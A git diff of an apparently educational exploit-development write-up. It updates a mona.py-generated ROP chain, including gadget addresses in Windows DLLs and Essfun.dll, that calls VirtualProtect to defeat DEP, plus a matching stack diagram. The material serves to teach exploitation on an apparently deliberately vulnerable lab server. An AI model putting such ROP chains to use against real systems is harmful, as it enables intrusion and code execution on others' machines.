@@ -160,41 +160,42 @@ The exploit works as follows. We first generate a ROP chain, a sequence of addre
     2. We can try executing this ROP chain by modifying the program to reflect the [exploit1.py](./SourceCode/exploit1.py) program. Below is the function in the `rop_chain.txt` function.
 
 ```
-def create_rop_chain():
+  def create_rop_chain():
+
     # rop chain generated with mona.py - www.corelan.be
     rop_gadgets = [
-        #[---INFO:gadgets_to_set_esi:---]
-        0x76e494ee,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
-        0x76796164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
-        0x76333a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
-        #[---INFO:gadgets_to_set_ebp:---]
-        0x7671d3e6,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
-        0x766e77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ebx:---]
-        0x7654252c,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
-        0xfffffdff,  # Value to negate, will become 0x00000201
-        0x76e3c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
-        0x77043349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
-        #[---INFO:gadgets_to_set_edx:---]
-        0x7704320b,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
-        0xffffffc0,  # Value to negate, will become 0x00000040
-        0x76da1f0a,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
-        0x76d012db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
-        #[---INFO:gadgets_to_set_ecx:---]
-        0x752f4414,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
-        0x62504802,  # &Writable location [Essfun.dll]
-        #[---INFO:gadgets_to_set_edi:---]
-        0x76d6eda4,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
-        0x76f077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_eax:---]
-        0x76f3e2d0,  # POP EAX # RETN [WS2_32.dll] ** REBASED ** ASLR 
-        0x90909090,  # nop
-        #[---INFO:pushad:---]
-        0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_esi:---]
+      0x774c2ce5,  # POP EBX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+      0x75bf6164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
+      0x75dd3a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x77444218,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+      0x75b477c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x75b89801,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x76139874,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
+      0x77943349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x75dcb20f,  # POP EAX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x7658aa2d,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+      0x7789a5ca,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x75b4aa0b,  # POP ECX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+      0x62504965,  # &Writable location [Essfun.dll]
+      #[---INFO:gadgets_to_set_edi:---]
+      0x75b424d3,  # POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+      0x75a277c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_eax:---]
+      0x75b98ba3,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+      0x90909090,  # nop
+      #[---INFO:pushad:---]
+      0x773126d0,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
     ]
     return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
 ```
-*Note*: We will need to modify the *return ''.join(struct.pack('<I', _) for _ in rop_gadgets)* above to be *return b''.join(struct.pack('<I', _) for _ in rop_gadgets)* as without converting it to a byte string with *b*, we will receive errors!
+*Note*: We will need to modify *return ''.join(struct.pack('<I', _) for _ in rop_gadgets)* above to be *return b''.join(struct.pack('<I', _) for _ in rop_gadgets)* as without converting it to a byte string with *b*, we will receive errors!
 
 When *create_rop_chain()* runs, it fills up the stack as follows starting *ROP chain start*. Registers shown on the left indicate at which gadget a register is set.
 
@@ -212,11 +213,11 @@ When *create_rop_chain()* runs, it fills up the stack as follows starting *ROP c
              ----------------   
 EAX          |              | POP EAX # RETN
              ----------------   
-             | 0x76f077c7   | RETN (ROP NOP)
+             | 0x75a277c7   | RETN (ROP NOP)
              ----------------   
 EDI          |              | POP EDI # RETN
              ----------------   
-ECX          | 0x62504802   | &Writable location
+ECX          | 0x62504965   | &Writable location
              ----------------   
              |              | POP ECX # RETN
              ----------------   
@@ -236,13 +237,13 @@ EBX          |              | XCHG EAX,EBX # RETN
              ----------------   
              |              | POP EAX # RETN
              ----------------   
-             | 0x766e77c5   | & push esp # ret
+             | 0x75b477c5   | & push esp # ret
              ----------------   
 EBP          |              | POP EBP # RETN
              ----------------   
 ESI          |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
              ----------------   
-             | 0x76796164   | ptr to &VirtualProtect()    
+             | 0x75bf6164   | ptr to &VirtualProtect()    
              ----------------   
 ROP chain    |              | POP EBX # RETN
 start        ----------------   
